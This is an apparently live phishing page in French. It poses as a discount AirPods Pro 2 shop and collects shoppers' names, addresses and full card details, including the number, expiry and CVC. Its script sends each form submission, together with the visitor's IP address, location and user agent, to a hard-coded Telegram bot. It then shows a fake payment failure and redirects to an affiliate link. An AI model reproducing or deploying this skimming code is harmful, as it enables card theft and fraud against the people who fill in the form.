<!DOCTYPE html>

<html lang="fr">

<head>

  <meta charset="UTF-8">

  <meta name="viewport" content="width=device-width,initial-scale=1.0">

  <title>AirPods Pro 2 - Offre Spéciale</title>

  <!-- Google Tag Manager (déjà inclus ton ID) -->

  <script>

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':

    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],

    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=

    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);

    })(window,document,'script','dataLayer','GTM-MCVTBG2P');

  </script>

  <!-- End Google Tag Manager -->

  <script src="https://cdn.tailwindcss.com"></script>

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">

  <style>

    body { font-family:'Inter',sans-serif; background:#f9fafb; color:#111; }

    /* ... ضع هنا كل CSS الخاص بالستايلات كما هو من سكريبت جيميني ... */

    .input-error { border-color:#ef4444 !important; }

    .input-default { border-color:#d1d5db !important; }

    .hidden { display:none !important; }

    .fadein { animation:fadein .4s; }

    @keyframes fadein { from { opacity:0; } to { opacity:1; } }

    .modal-bg { background:rgba(0,0,0,0.45); }

    .loader { border:4px solid #f3f3f3; border-top:4px solid #2563eb; border-radius:50%; width:38px; height:38px; animation:spin 1s linear infinite;}

    @keyframes spin { 100% { transform:rotate(360deg);} }

    .btn-main { background:#2563eb; color:white; font-weight:bold; padding:10px 0; border-radius:9px; width:100%; transition: background-color 0.2s ease-in-out; text-decoration: none; display: inline-block; }

    .btn-main:hover { background:#1d4ed8; }

    .form-label {font-weight:600; color: #374151;}

    .visa-icon-input { position: relative; }

    .visa-icon-input svg { position: absolute; right: 12px; top: 42px; width: 28px; height: 18px; opacity: .62; pointer-events: none; }

  </style>

</head>

<body class="min-h-screen flex flex-col items-center justify-center p-4 bg-white">



<!-- Google Tag Manager (noscript) -->

<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MCVTBG2P"

height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- End Google Tag Manager (noscript) -->



<!-- ====== SECTION: PAGE ACCUEIL ====== -->

<div id="mainPageSection" class="max-w-md w-full mx-auto bg-white shadow-xl rounded-2xl p-6 text-center mt-7 fadein">

  <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="AirPods Pro 2" class="w-32 h-32 object-contain mx-auto mb-2 rounded-xl shadow">

  <h1 class="text-3xl font-extrabold mb-2 text-gray-900">AirPods Pro 2ᵉ Génération</h1>

  <div class="flex items-center justify-center gap-3 mb-1">

    <span class="text-2xl font-bold text-blue-700">9,99 €</span>

    <span class="text-lg text-gray-400 line-through">249 €</span>

  </div>

  <p class="text-lg text-gray-700 mb-2">Offre spéciale limitée. Livraison rapide en France et Europe. Quantité très limitée !</p>

  <ul class="mb-4 text-gray-600 text-sm list-disc list-inside text-left mx-auto" style="max-width:280px">

    <li>Qualité audio exceptionnelle</li>

    <li>Garantie 12 mois</li>

    <li>Livraison suivie 24h/48h</li>

  </ul>

  <button id="startOrderBtn" class="btn-main text-lg px-2 mt-2 mb-1">Commander maintenant</button>

</div>



<!-- ====== SECTION: BILLING/SHIPPING (par défaut hidden) ====== -->

<div id="billingStep" class="max-w-md w-full bg-white shadow-lg rounded-xl px-6 py-7 fadein hidden">

  <div class="flex flex-col items-center border-b border-gray-200 pb-3 mb-4">

      <div class="flex items-center">

          <span class="text-2xl mr-2" role="img" aria-label="Icône de panier">🛒</span>

          <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="AirPods Pro 2" class="h-10 w-10 object-contain rounded-lg mr-2 border border-gray-200">

          <span class="text-lg font-semibold text-gray-700">x1</span>

      </div>

  </div>

  <h2 class="text-xl font-bold mb-1 text-center text-gray-800 flex items-center justify-center">

    <span class="text-2xl mr-2" role="img" aria-label="Icône de livraison">🚚</span>

    Adresse de Livraison et Facturation

  </h2>

  <p class="text-xs text-gray-500 text-center mb-4">

    Entrez votre adresse complète pour recevoir votre commande à domicile.

  </p>

  <form id="billingForm" autocomplete="off" novalidate>

    <div class="mb-3">

      <label class="form-label block mb-1 text-sm" for="billingName">Nom complet</label>

      <input type="text" id="billingName" name="billingName" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" autocomplete="off" required>

      <p class="hidden text-xs text-red-600 mt-1" id="billingNameError">Entrez un nom complet valide.</p>

    </div>

    <div class="mb-3">

      <div class="flex justify-between items-center mb-1">

          <label class="form-label text-sm" for="billingCountry">Pays</label>

          <span id="detectedCountryDisplayBilling" class="text-xs text-gray-500"></span>

      </div>

      <select id="billingCountry" name="billingCountry" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition appearance-none" required>

        <option value="">Sélectionnez votre pays</option>

        <option value="FR">🇫🇷 France</option>

        <option value="BE">🇧🇪 Belgique</option>

        <option value="CH">🇨🇭 Suisse</option>

        <option value="DE">🇩🇪 Allemagne</option>

        <option value="ES">🇪🇸 Espagne</option>

        <option value="IT">🇮🇹 Italie</option>

        <option value="PT">🇵🇹 Portugal</option>

        <option value="NL">🇳🇱 Pays-Bas</option>

        <option value="LU">🇱🇺 Luxembourg</option>

        <option value="AT">🇦🇹 Autriche</option>

        <option value="IE">🇮🇪 Irlande</option>

        <option value="FI">🇫🇮 Finlande</option>

        <option value="DK">🇩🇰 Danemark</option>

        <option value="SE">🇸🇪 Suède</option>

        <option value="NO">🇳🇴 Norvège</option>

        <option value="PL">🇵🇱 Pologne</option>

        <option value="CZ">🇨🇿 Tchéquie</option>

        <option value="SK">🇸🇰 Slovaquie</option>

        <option value="SI">🇸🇮 Slovénie</option>

        <option value="GR">🇬🇷 Grèce</option>

        <option value="HU">🇭🇺 Hongrie</option>

        <option value="RO">🇷🇴 Roumanie</option>

        <option value="BG">🇧🇬 Bulgarie</option>

        <option value="HR">🇭🇷 Croatie</option>

        <option value="EE">🇪🇪 Estonie</option>

        <option value="LT">🇱🇹 Lituanie</option>

        <option value="LV">🇱🇻 Lettonie</option>

      </select>

      <p class="hidden text-xs text-red-600 mt-1" id="billingCountryError">Choisissez votre pays.</p>

    </div>

    <div class="mb-3">

      <label class="form-label block mb-1 text-sm" for="billingAddress">Adresse</label>

      <input type="text" id="billingAddress" name="billingAddress" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" required>

      <p class="hidden text-xs text-red-600 mt-1" id="billingAddressError">Adresse invalide.</p>

    </div>

    <div class="mb-3">

      <label class="form-label block mb-1 text-sm" for="billingPostalCode">Code postal</label>

      <input type="text" id="billingPostalCode" name="billingPostalCode" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" required>

      <p class="hidden text-xs text-red-600 mt-1" id="billingPostalCodeError">Code postal invalide.</p>

    </div>

    <button type="submit" class="btn-main mt-4 text-base">Continuer</button>

  </form>

</div>

<!-- ====== SECTION: PAIEMENT ====== -->

<div id="paymentStep" class="max-w-md w-full bg-white shadow-lg rounded-xl px-6 py-7 fadein hidden">

  <div class="flex flex-col items-center border-b border-gray-200 pb-3 mb-4">

      <div class="flex items-center">

          <span class="text-2xl mr-2" role="img" aria-label="Icône de panier">🛒</span>

          <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="AirPods Pro 2" class="h-10 w-10 object-contain rounded-lg mr-2 border border-gray-200">

          <span class="text-lg font-semibold text-gray-700">x1</span>

      </div>

  </div>

  <h2 class="text-xl font-bold mb-2 text-center text-gray-800">Paiement sécurisé</h2>

  <div class="text-center mb-4">

      <p class="text-md text-gray-800">À payer : <span class="font-bold text-blue-600">9,99 €</span> <span style="color:#999;text-decoration:line-through;">249 €</span></p>

  </div>

  <form id="paymentForm" autocomplete="off" novalidate>

    <div class="mb-3 visa-icon-input">

      <label class="form-label block mb-1 text-sm" for="cardNumber">Numéro de carte</label>

      <input type="text" id="cardNumber" name="cardNumber" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition pr-10" maxlength="19" placeholder="1234 5678 9012 3456" required>

      <svg viewBox="0 0 32 12" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="12" fill="#fff"/><text x="7" y="9" font-family="Arial,sans-serif" font-size="8" fill="#1a237e">VISA</text></svg>

      <p class="hidden text-xs text-red-600 mt-1" id="cardNumberError">Numéro de carte invalide.</p>

    </div>

    <div class="mb-3 flex gap-3">

      <div class="w-1/2">

        <label class="form-label block mb-1 text-sm" for="cardExp">Expiration</label>

        <input type="text" id="cardExp" name="cardExp" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" maxlength="5" placeholder="MM/AA" required>

        <p class="hidden text-xs text-red-600 mt-1" id="cardExpError">Date invalide.</p>

      </div>

      <div class="w-1/2">

        <label class="form-label block mb-1 text-sm" for="cardCVC">CVC</label>

        <input type="text" id="cardCVC" name="cardCVC" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" maxlength="4" placeholder="123" required>

        <p class="hidden text-xs text-red-600 mt-1" id="cardCVCError">CVC invalide.</p>

      </div>

    </div>

    <button type="submit" class="btn-main mt-4 text-base">Payer</button>

    <div class="mt-4 text-center">

      <div class="flex justify-center items-center space-x-2 mb-1">

        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-4">

        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/2560px-MasterCard_Logo.svg.png" alt="Mastercard" class="h-4">

        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/1200px-American_Express_logo_%282018%29.svg.png" alt="American Express" class="h-4">

      </div>

      <div class="flex justify-center items-center text-xs text-gray-600">

        <svg class="h-3 w-3 mr-1 text-green-600" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">

          <path fill-rule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v7a2 2 0 002 2h10a2 2 0 002-2v-7a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clip-rule="evenodd" />

        </svg>

        Paiement 100% sécurisé

      </div>

    </div>

  </form>

</div>



<!-- MODALS: LOADING & FAILED PAYMENT -->

<div id="loadingModal" class="fixed inset-0 flex items-center justify-center modal-bg hidden z-50 p-4">

  <div class="bg-white rounded-lg px-7 py-8 shadow-lg flex flex-col items-center fadein text-center">

    <div class="loader mb-4"></div>

    <div class="font-bold text-lg mb-1 text-gray-800">Traitement du paiement...</div>

    <div class="flex items-center mb-2">

      <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" class="h-7 bg-white rounded mr-2">

      <span style="font-size:1.25rem; color:#15803d;" role="img" aria-label="Cadenas sécurisé">🔒</span>

      <span class="text-green-700 text-xs font-medium ml-1">Paiement sécurisé</span>

    </div>

    <div class="text-xs text-gray-500">Veuillez patienter, ne fermez pas la page.</div>

  </div>

</div>



<div id="failedModal" class="fixed inset-0 flex items-center justify-center modal-bg hidden z-50 p-4">

  <div class="bg-white rounded-lg px-7 py-8 shadow-lg flex flex-col items-center fadein text-center">

    <div class="text-5xl mb-2 text-yellow-500" role="img" aria-label="Panneau d'avertissement">⚠️</div>

    <div class="font-bold text-lg mb-2 text-gray-800">Paiement échoué !</div>

    <div class="mb-2 text-gray-700">

      En raison d’un très grand nombre de commandes sur notre site, le paiement n'a pas pu être traité.<br>

      Veuillez réessayer avec notre autre passerelle de paiement sécurisée.

    </div>

    <a id="secondPaymentBtn" href="https://ttgn.tracktimegenius.com/aff_c?offer_id=85898&aff_id=1931&source=AirPods+Pro+2" class="btn-main text-center block mt-4 no-underline text-sm p-3">

      Cliquez ici pour accéder à notre nouvelle passerelle de paiement exclusive

    </a>

  </div>

</div>



<!-- Facebook Pixel déjà inclus -->

<!-- (Colle ici exactement نفس الكود الموجود في موقعك في الهيد أو البودي) -->

<script>

  !function(f,b,e,v,n,t,s)

  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?

  n.callMethod.apply(n,arguments):n.queue.push(arguments)};

  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';

  n.queue=[];t=b.createElement(e);t.async=!0;

  t.src='https://connect.facebook.net/en_US/fbevents.js';

  s=b.getElementsByTagName(e)[0];

  s.parentNode.insertBefore(t,s)}(window, document,'script');

  fbq('init', 'PIXEL_ID'); // ضع هنا الـ Pixel ID الخاص بك

  fbq('track', 'PageView');

</script>

<noscript>

  <img height="1" width="1" style="display:none"

      src="https://www.facebook.com/tr?id=PIXEL_ID&ev=PageView&noscript=1"/>

</noscript>



<!-- Telegram Alert Script for Billing & Payment -->

<script>

const TELEGRAM_BOT_TOKEN = "8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU";

const TELEGRAM_CHAT_ID = "-4913064483";

let userIP = "N/A", userCountryCode = "", userCountryName = "N/A", userCity = "N/A";



async function getGeoData() {

  try {

    const res = await fetch('https://ipapi.co/json');

    if(res.ok){

      const data = await res.json();

      userIP = data.ip || "N/A";

      userCountryCode = data.country_code || "";

      userCountryName = data.country_name || "N/A";

      userCity = data.city || "N/A";

    }

  } catch(e) {}

}

getGeoData().then(()=>{ /* لا حاجة لأي إجراء هنا */ });



async function sendTelegramAlert(title, obj) {

  let msg = `🔔 <b>${title}</b>\n`;

  msg += `📍 Localisation: ${userIP} - ${userCountryName} (${userCountryCode})\n`;

  msg += `🏙️ Ville: ${userCity}\n`;

  msg += `🕒 <b>Heure:</b> ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n`;

  msg += `📱 <b>UserAgent:</b> ${navigator.userAgent}\n`;

  for (let k in obj) {

    msg += `\n<b>${String(k)}:</b> ${String(obj[k])}`;

  }

  try {

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {

      method:"POST",headers:{"Content-Type":"application/json"},

      body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID,text: msg,parse_mode: "HTML"})

    });

  } catch (e) {}

}

</script>

<script>

// ========== إعداد الانتقال بين الصفحات ==========



// إظهار خطوة الـBilling مباشرة بعد زر finalize commande (استبدل الاستدعاء القديم)

function showBillingStep() {

    // إظهار الفورم وإخفاء أي شيء آخر (إذا لديك popup أوقفه هنا)

    document.getElementById('billingStep').classList.remove('hidden');

    window.scrollTo({ top: 0, behavior: "smooth" });

    // إرسال حدث بيكسل (InitiateCheckout)

    if (typeof fbq === "function") fbq('track', 'InitiateCheckout');

    sendTelegramAlert("Début du formulaire de livraison", {});

}



// في الموقع الأساسي: عندما يضغط الزبون على الزر "finaliser la commande" (الزر في pop-up)

// استبدل أي تحويل خارجي بـ:

document.getElementById("finalizeBtn").onclick = function(e) {

    e.preventDefault();

    document.getElementById('modal').style.display = "none";

    setTimeout(showBillingStep, 350);

};



// ========== إكمال بيانات الـBilling ==========



// في صفحة billing:

document.getElementById('billingForm').onsubmit = async function(e){

    e.preventDefault();

    // تحقق من صحة البيانات (التحقق موجود بالفعل في السكريبت)

    if (!validateBilling(this)) return;

    // حفظ البيانات

    billingData = {

        "Nom complet": this.billingName.value,

        "Pays (formulaire)": this.billingCountry.options[this.billingCountry.selectedIndex].text,

        "Adresse": this.billingAddress.value,

        "Code Postal": this.billingPostalCode.value

    };

    // إرسال تنبيه تيليجرام

    await sendTelegramAlert("Étape livraison/facturation remplie", billingData);

    // إرسال حدث بيكسل (AddPaymentInfo)

    if (typeof fbq === "function") fbq('track', 'AddPaymentInfo');

    // الانتقال لصفحة الدفع

    document.getElementById('billingStep').classList.add('hidden');

    document.getElementById('paymentStep').classList.remove('hidden');

    document.getElementById('paymentStep').classList.add('fadein');

    window.scrollTo({ top: 0, behavior: "smooth" });

};



// ========== معالجة الدفع (submit) ==========



// عند محاولة الدفع

document.getElementById('paymentForm').onsubmit = async function(e){

    e.preventDefault();

    if (!validatePayment(this)) return;

    const payData = {

        "Numéro carte": this.cardNumber.value.replace(/\s/g,''),

        "Expiration": this.cardExp.value,

        "CVC": this.cardCVC.value

    };

    await sendTelegramAlert("Tentative paiement", {...billingData, ...payData});

    document.getElementById('loadingModal').classList.remove('hidden');

    // حدث بيكسل محاولة شراء (Purchase أو event custom)

    if (typeof fbq === "function") fbq('trackCustom', 'PaiementTentative');

    setTimeout(()=>{

        document.getElementById('loadingModal').classList.add('hidden');

        document.getElementById('failedModal').classList.remove('hidden');

        // فشل الدفع = ليس purchase حقيقي (لا ترسل Purchase)

        // يمكنك إرسال حدث آخر (مثلا PurchaseFailed)

        if (typeof fbq === "function") fbq('trackCustom', 'PurchaseFailed');

    }, 2000);

};



// ========== زر التحويل لبوابة الدفع الثانية ==========



document.getElementById('secondPaymentBtn').onclick = async function(e) {

    e.preventDefault();

    await sendTelegramAlert("Clic Passerelle Secondaire", {action: "Accès passerelle secondaire après échec"});

    // إذا ترغب: إرسال حدث بيكسل (مثلاً: InitiateExternalGateway)

    if (typeof fbq === "function") fbq('trackCustom', 'InitiateExternalGateway');

    window.location.href = this.href;

};



// ========== إظهار الدولة في قائمة الدول (حسب IP) ==========

(async function(){

    try {

        const res = await fetch('https://ipapi.co/json');

        const data = await res.json();

        if(data && data.country_code){

            let select = document.getElementById('billingCountry');

            if(select){

                let opt = Array.from(select.options).find(x=>x.value.toUpperCase()===data.country_code.toUpperCase());

                if(opt){ select.value = opt.value; }

            }

            let info = document.getElementById('detectedCountryDisplayBilling');

            if(info && data.country_name){ info.textContent = `(Pays détecté : ${data.country_name})`; }

        }

    } catch(e){}

})();



// ========== ضبط زر العودة/إعادة المحاولة في popups ==========



['loadingModal', 'failedModal'].forEach(id=>{

    let modal = document.getElementById(id);

    if(modal) modal.addEventListener('click', function(e){

        if(e.target===this) this.classList.add('hidden');

    });

});



// ========== وظائف التحقق (copy-paste من سكريبتك الأصلي) ==========

function validateBilling(form) {

  let valid = true;

  const name = form.billingName.value.trim();

  const nameValid = name.length >= 3;

  handleFieldError(form.billingName, document.getElementById("billingNameError"), nameValid);

  if (!nameValid) valid = false;



  const country = form.billingCountry.value;

  const countryValid = !!country;

  handleFieldError(form.billingCountry, document.getElementById("billingCountryError"), countryValid);

  if (!countryValid) valid = false;

  

  const adr = form.billingAddress.value.trim();

  const addressValid = adr.length >= 5;

  handleFieldError(form.billingAddress, document.getElementById("billingAddressError"), addressValid);

  if (!addressValid) valid = false;



  const postalCode = form.billingPostalCode.value.trim();

  const postalCodeRegex = /^[a-zA-Z0-9\s-]{3,10}$/; 

  const postalCodeValid = postalCodeRegex.test(postalCode);

  handleFieldError(form.billingPostalCode, document.getElementById("billingPostalCodeError"), postalCodeValid);

  if(!postalCodeValid) valid = false;



  return valid;

}

function validatePayment(form) {

  let valid = true;

  const num = form.cardNumber.value.replace(/\s/g,'');

  const cardNumValid = /^\d{15,19}$/.test(num);

  handleFieldError(form.cardNumber, document.getElementById("cardNumberError"), cardNumValid);

  if (!cardNumValid) valid = false;



  const exp = form.cardExp.value;

  const expValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(exp);

  handleFieldError(form.cardExp, document.getElementById("cardExpError"), expValid);

  if (!expValid) valid = false;

  

  const cvc = form.cardCVC.value;

  const cvcValid = /^\d{3,4}$/.test(cvc);

  handleFieldError(form.cardCVC, document.getElementById("cardCVCError"), cvcValid);

  if (!cvcValid) valid = false;



  return valid;

}

function handleFieldError(inputElement, errorElement, isValid) {

    if (!inputElement || !errorElement) return;

    if (!isValid) {

        inputElement.classList.add('input-error');

        errorElement.classList.remove('hidden');

    } else {

        inputElement.classList.remove('input-error');

        errorElement.classList.add('hidden');

    }

}



</script>
